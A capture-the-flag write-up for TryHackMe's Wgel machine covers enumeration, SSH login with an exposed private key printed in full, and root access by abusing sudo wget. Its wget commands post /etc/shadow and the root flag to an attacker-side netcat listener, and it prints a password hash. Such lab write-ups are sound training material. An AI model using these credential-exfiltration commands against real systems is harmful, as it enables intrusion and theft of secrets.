# TryHackMe: Wgel CTF Writeup

## Enumeration:
	
### Port Scan:

First started with an NMap scan:
	
```shell
sudo nmap -vv -sC -sV -sS -oN nmap_out.txt {MACHINE IP}
```

The scan returned the following ports:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
```

Full scan information saved in [nmap_out.txt](./nmap_out.txt)

### Directory Enumeration:

I then initiated a GoBuster scan:
	
```shell
gobuster -e -t 50 -u {MACHINE IP} -w common.txt -x .php,.txt,.js,.html
```

(I also ran GoBuster on the subdirectories I found. I put all the directories on the list below)

Returned the following:
	
```
http://{MACHINE IP}/index.html (Status: 200)
http://{MACHINE IP}/index.html (Status: 200)
http://{MACHINE IP}/sitemap (Status: 301)
http://{MACHINE IP}/sitemap/.ssh (Status: 301)
http://{MACHINE IP}/sitemap/about.html (Status: 200)
```

### SSH Private Key:
	
I looked into the **http://{MACHINE IP}/sitemap/.ssh** directory, and found the file **id_rsa**:
	
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```

This will be very useful. Now we just need to find a username that works.

### Website Exploration:
	
I opened the **"http://{MACHINE IP}/index.html"** website on my browser:
	
![Home Page](./screenshots/home_page.png)

As far as I can see, it is supposed to be a App/Portfolio/Blog website. I tried traversing through the website, I found a contact form on the **"http://{MACHINE IP}/sitemap/contact.html"** page:
	
![Contact Form](./screenshots/contact_form.png)

When the form is submitted, it sends out the following GET request:
	
```
http://{MACHINE IP}/sitemap/contact.html?message={your message here}
```

I put the URL into SQLMap to check for vulnerabilities:
	
```
sqlmap -u "http://{MACHINE IP}/sitemap/contact.html?message=hello*"
```

SQLMap did not find any vulnerabilities in the URL... ...Back to the drawing board.

On the **http://{MACHINE IP}/sitemap/about.html** page, there is a list of employees. I thought maybe it is possible to SSH in with their names.

![employees](./screenshots/employees.png)

I did not find any success with that.

I looked throughout the source code, and I found this:
	
![Username "Jessie"](./screenshots/username_in_source_code.png)

Perhaps this is a username I could ssh into?

So I tried it:
	
```shell
ssh jessie@10.10.240.122 -i id_rsa

---
jessie@CorpOne:~$ 

```

Yes! We are in! Now let's see if we can find that user flag:
	
```shell
find / -type f -name 'user*' 2>/dev/null
```

It returned the following:

```
...
/home/jessie/.config/user-dirs.dirs
/home/jessie/.config/dconf/user
/home/jessie/Documents/user_flag.txt
```

Here is the contents of **user_flag.txt**:
	
```
057c67131c3d5e42dd5cd3075b198ff6
```

## Privelege Escalation:
	
I then checked for privelege escalation vectors. I entered the following:
	
```shell
jessie@CorpOne:~$ sudo -l

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

It looks like we have super-user permissions to run the **"wget"** program. I looked into exploits for wget, and found this one: [wget_exploit](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/)

To start, I set up a NetCat listener on my attacker machine, and I directed the output to a file called **hash**:
	
```shell
sudo nc -nlvp 80 > hash
```

Then, on the TryHackMe Machine, I ran the following command:
	
```shell
sudo /usr/bin/wget --post-file=/etc/shadow {TryHackMe_VPN_IP}
```

I'll parse out exactly what's going on: We are using wget(with which we have sudo priveleges) to retrieve the **/etc/shadow** file(which contains password hashes), and sending it to our attacking PC. Since the attacking PC has a NetCat listener running, it catches the info, and stores it in the **hash** file.

Here are the results in our **hash** file:
	
```
...
jessie:$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.:18195:0:99999:7:::
sshd:*:18195:0:99999:7:::
```

I then put the hash into hashcat. After running it for about 30 minutes, I still came up with nothing. Since this is an "easy" CTF, I assume that they do not expect you to spend hours cracking the password.

Well, no big deal. With this "wget" exploit, we can still read any file with root priveleges. We just don't know where the flag is. Usually on CTFs, they put the flag in the **"/root/"** directory. Seeing that the user flag was named **"user_flag.txt"** I'll try to wget the **"/root/root_flag.txt"** file, and see if it exists:
	
First, I set up another NetCat listener on my attacking PC:
	
```shell
sudo nc -nlvp 80 > root_flag.txt
```

Then I run the wget exploit again, except I change the post-file to **"/root/root_flag.txt"**:
	
```shell
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt {TryHackMe_VPN_IP}
```
	
It looks like it worked! Here is the contents of the root_flag.txt file on our attacking PC:
	
```
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.9.221.49
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

That Part at the bottom is the flag! That is it! I hope you enjoyed this and found it informative!

















































































